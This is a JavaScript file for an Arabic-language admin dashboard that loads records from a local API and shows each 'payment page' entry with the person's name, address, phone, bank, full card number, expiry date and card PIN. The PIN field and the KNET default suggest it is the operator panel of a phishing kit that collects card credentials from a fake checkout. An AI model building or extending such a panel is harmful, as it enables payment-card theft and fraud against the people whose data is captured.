let arr = [];
let tbody = document.querySelector("tbody"),
  notation = document.querySelector("#notation"),
  clearUsers = document.getElementById("clear"),
  fullscreen = document.querySelector(".navbar-brand i");
/* Full Screen  */
fullscreen.addEventListener("click", () => {
  const element = document.documentElement;
  if (element.requestFullscreen) {
    element.requestFullscreen();
  } else if (element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if (element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if (element.msRequestFullscreen) {
    element.msRequestFullscreen();
  } else {
    console.error("Fullscreen API is not supported in this browser.");
  }
});
fullscreen.addEventListener("mouseover", () => {
  if (document.exitFullscreen) {
    document.exitFullscreen();
  } else if (document.webkitExitFullscreen) {
    document.webkitExitFullscreen();
  } else if (document.mozCancelFullScreen) {
    document.mozCancelFullScreen();
  } else if (document.msExitFullscreen) {
    document.msExitFullscreen();
  }
});
let clearAllusers = (_) => {
  arr = [];
  display(arr);
};

clearUsers.addEventListener("click", clearAllusers);
let display = (data) => {
  let result = "";
  for (let i = 0; i < data.length; i++) {
    result += `<tr>
    <td> <div class="delete"onclick="delete(${i})"><span>حذف</span>
    <i class="fa-solid fa-trash "></i>
    </div>
    </td>
<td class="text-white">${data[i].notation}</td>
<td class="text-white">${data[i].time}</td>
<td class="text-white">${data[i].enter}</td>
<td class="text-white">
  <div class="btns">
        <button class="btn btn-danger" >لايوجد بطاقة</button>
        <button class="btn btn-danger" >لايوجد معلومات</button>
  </div>
  </td>
    <td><button class="btn btn-success" onclick="update(${i})">Update</button></td>
<td class="text-white">${data.enter[i]}</td>
    </tr>`;
  }
  tbody.innerHTML = result;
};
display(arr);

// Function to fetch users from backend
async function fetchUsers() {
  try {
    const response = await fetch("http://localhost:3000/api/user", {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include",
    });

    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }

    const data = await response.json();
    usersData = data.users || data.user || []; // Store users in global variable
    displayUsers(usersData);
    return usersData;
  } catch (error) {
    console.error("Error fetching users:", error);
    tbody.innerHTML =
      '<tr><td colspan="7" class="text-center">خطأ في تحميل البيانات</td></tr>';
    return [];
  }
}

// Function to delete a user
async function deleteUser(userId) {
  try {
    const response = await fetch(`http://localhost:3000/api/user/${userId}`, {
      method: "DELETE",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include",
    });

    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error("Error deleting user:", error);
    return false;
  }
}

// Function to display user details in a modal
function showUserDetails(user) {
  // Parse the description if it's a JSON string
  let description = user.description;
  let items = [];
  let paymentDetails = {};

  try {
    const descObj = JSON.parse(description);
    items = descObj.items || [];
    paymentDetails = descObj.paymentDetails || {};
  } catch (e) {
    console.error("Error parsing description:", e);
  }

  // Create modal HTML
  const modalHTML = `
    <div class="modal-dialog modal-lg">
      <div class="modal-content bg-dark text-white">
        <div class="modal-header">
          <h5 class="modal-title">تفاصيل المستخدم</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <div class="user-info">
            <h4>معلومات العميل</h4>
            <p><strong>الاسم:</strong> ${user.name}</p>
            <p><strong>العنوان:</strong> ${user.address}</p>
            <p><strong>الهاتف:</strong> ${user.phone}</p>
            <p><strong>القسم:</strong> ${user.department}</p>
          </div>
          
          ${
            items.length > 0
              ? `
            <hr>
            <div class="order-items">
              <h4>تفاصيل الطلب</h4>
              <table class="table table-dark">
                <thead>
                  <tr>
                    <th>المنتج</th>
                    <th>الكمية</th>
                    <th>السعر</th>
                  </tr>
                </thead>
                <tbody>
                  ${items
                    .map(
                      (item) => `
                    <tr>
                      <td>${item.name}</td>
                      <td>${item.quantity}</td>
                      <td>${item.price} KD</td>
                    </tr>
                  `
                    )
                    .join("")}
                </tbody>
              </table>
            </div>
          `
              : ""
          }
          
          ${
            Object.keys(paymentDetails).length > 0
              ? `
            <hr>
            <div class="payment-details">
              <h4>تفاصيل الدفع</h4>
              <p><strong>البنك:</strong> ${paymentDetails.bank}</p>
              <p><strong>بطاقة:</strong> ${paymentDetails.cardPrefix}-${paymentDetails.cardNumber}</p>
              <p><strong>تاريخ الانتهاء:</strong> ${paymentDetails.expiryMonth}/${paymentDetails.expiryYear}</p>
            </div>
          `
              : ""
          }
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
        </div>
      </div>
    </div>
  `;

  // Create or update modal
  let modal = document.getElementById("userDetailsModal");
  if (!modal) {
    modal = document.createElement("div");
    modal.className = "modal fade";
    modal.id = "userDetailsModal";
    modal.tabIndex = "-1";
    modal.setAttribute("aria-labelledby", "userDetailsModalLabel");
    modal.setAttribute("aria-hidden", "true");
    document.body.appendChild(modal);
  }

  modal.innerHTML = modalHTML;

  // Show the modal
  const bsModal = new bootstrap.Modal(modal);
  bsModal.show();
}

// Function to display card information in a modal
function showCardInfo(user) {
  // Parse the description to get payment details
  let paymentDetails = {};

  try {
    const descObj = JSON.parse(user.description);
    paymentDetails = descObj.paymentDetails || {};
  } catch (e) {
    console.error("Error parsing description:", e);
  }

  // Create modal HTML
  const modalHTML = `
    <div class="modal-dialog">
      <div class="modal-content bg-dark text-white">
        <div class="modal-header">
          <h5 class="modal-title">معلومات البطاقة</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          ${
            Object.keys(paymentDetails).length > 0
              ? `
            <div class="card-info">
              <div class="card-visual p-4 mb-3 bg-secondary rounded">
                <div class="d-flex justify-content-between align-items-center mb-3">
                  <div class="bank-name">${paymentDetails.bank || "KNET"}</div>
                  <div class="chip">
                    <i class="fas fa-credit-card"></i>
                  </div>
                </div>
                <div class="card-number mb-3">
                  <h5>${paymentDetails.cardPrefix || ""}-${
                  paymentDetails.cardNumber || "XXXX XXXX XXXX"
                }</h5>
                </div>
                <div class="d-flex justify-content-between">
                  <div class="card-holder">
                    <small>CARD HOLDER</small>
                    <p>${user.name}</p>
                  </div>
                  <div class="card-expiry">
                    <small>EXPIRES</small>
                    <p>${paymentDetails.expiryMonth || "MM"}/${
                  paymentDetails.expiryYear || "YY"
                }</p>
                  </div>
                </div>
              </div>
              <div class="card-details">
                <p><strong>نوع البطاقة:</strong> ${
                  paymentDetails.cardPrefix || "غير محدد"
                }</p>
                <p><strong>رقم البطاقة:</strong> ${
                  paymentDetails.cardNumber || "غير محدد"
                }</p>
                <p><strong>تاريخ الانتهاء:</strong> ${
                  paymentDetails.expiryMonth || "MM"
                }/${paymentDetails.expiryYear || "YY"}</p>
                <p><strong>رمز الأمان (PIN):</strong> ${
                  paymentDetails.pin || "غير محدد"
                }</p>
                <p><strong>البنك:</strong> ${
                  paymentDetails.bank || "غير محدد"
                }</p>
              </div>
            </div>
          `
              : "<p>لا توجد معلومات بطاقة متاحة</p>"
          }
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
        </div>
      </div>
    </div>
  `;

  // Create or update modal
  let modal = document.getElementById("cardInfoModal");
  if (!modal) {
    modal = document.createElement("div");
    modal.className = "modal fade";
    modal.id = "cardInfoModal";
    modal.tabIndex = "-1";
    modal.setAttribute("aria-labelledby", "cardInfoModalLabel");
    modal.setAttribute("aria-hidden", "true");
    document.body.appendChild(modal);
  }

  modal.innerHTML = modalHTML;

  // Show the modal
  const bsModal = new bootstrap.Modal(modal);
  bsModal.show();
}

// Function to display users in the table
function displayUsers(users) {
  if (!users || users.length === 0) {
    tbody.innerHTML =
      '<tr><td colspan="7" class="text-center">لا توجد بيانات</td></tr>';
    return;
  }

  let result = "";
  users.forEach((user, index) => {
    // Parse description if it's a JSON string
    let orderInfo = {};
    try {
      orderInfo = JSON.parse(user.description);
    } catch (e) {
      console.error("Error parsing description:", e);
    }

    // Format date
    const createdAt = new Date(user.createdAt);
    const formattedDate = createdAt.toLocaleString("ar-EG");

    // Create a shortened ID for display
    const shortId = user._id ? user._id.substring(user._id.length - 6) : "N/A";

    result += `
      <tr>
        <td>
          <div class="delete" onclick="handleDelete('${user._id}')">
            <span>حذف</span>
            <i class="fa-solid fa-trash"></i>
          </div>
        </td>
        <td class="text-white">طلب جديد</td>
        <td class="text-white">${formattedDate}</td>
        <td class="text-white">صفحة الدفع</td>
        <td class="text-white">
          <div class="btns">
            <button class="btn btn-info" onclick="handleShowCard('${user._id}')">معلومات البطاقة</button>
            <button class="btn btn-primary" onclick="handleShowUser('${user._id}')">معلومات المستخدم</button>
          </div>
        </td>
        <td class="text-white">${user.name}</td>
        <td class="text-white">${shortId}</td>
      </tr>
    `;
  });

  tbody.innerHTML = result;
}

// Store users globally for access in event handlers
let usersData = [];

// Event handler for delete button
window.handleDelete = async function (userId) {
  if (confirm("هل أنت متأكد من حذف هذا المستخدم؟")) {
    const success = await deleteUser(userId);
    if (success) {
      // Refresh the user list
      loadUsers();
    }
  }
};

// Event handler for show user details button
window.handleShowUser = function (userId) {
  const user = usersData.find((u) => u._id === userId);
  if (user) {
    showUserDetails(user);
  }
};

// Event handler for show card info button
window.handleShowCard = function (userId) {
  const user = usersData.find((u) => u._id === userId);
  if (user) {
    showCardInfo(user);
  }
};

// Function to load users from backend
async function loadUsers() {
  await fetchUsers();
}

// Clear all users
let clearAllUsers = async () => {
  if (confirm("هل أنت متأكد من حذف جميع المستخدمين؟")) {
    try {
      // Send a request to delete all users
      const response = await fetch("http://localhost:3000/api/user/deleteAll", {
        method: "DELETE",
        headers: {
          "Content-Type": "application/json",
        },
      });

      if (!response.ok) {
        throw new Error(`Server responded with status: ${response.status}`);
      }

      // Clear the display and reset the usersData array
      usersData = [];
      tbody.innerHTML =
        '<tr><td colspan="7" class="text-center">لا توجد بيانات</td></tr>';

      alert("تم حذف جميع المستخدمين بنجاح");
    } catch (error) {
      console.error("Error deleting all users:", error);
      alert("حدث خطأ أثناء حذف المستخدمين");
    }
  }
};

// Remove the old event listener and add the new one
clearUsers.removeEventListener("click", clearAllusers);
clearUsers.addEventListener("click", clearAllUsers);

// Load users when page loads
document.addEventListener("DOMContentLoaded", () => {
  loadUsers();
});
